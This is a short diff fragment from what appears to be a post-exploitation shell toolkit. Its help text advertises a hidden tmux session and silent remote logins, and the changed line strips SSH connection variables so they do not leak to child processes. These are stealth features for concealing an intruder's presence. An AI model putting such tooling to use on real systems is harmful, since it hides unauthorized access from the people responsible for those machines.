 ${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. wont show with 'tmux list-s']
 ${CDC} xssh & xscp                           ${CDM}Silently log in to remote host
@@ -2954,7 +3249,7 @@ hs_info
 # unset all functions that are no longer needed.
 unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
 # Keep these but do not leak them to child processes.
-unset -n SSH_CONNECTION SSH_CLIENT
+unset -n SSH_CONNECTION SSH_CLIENT 2>/dev/null || unset SSH_CONNECTION SSH_CLIENT
 unset _HSURLORIGIN
 
 # Exit with TRUE in case parent shell ues 'set -e':
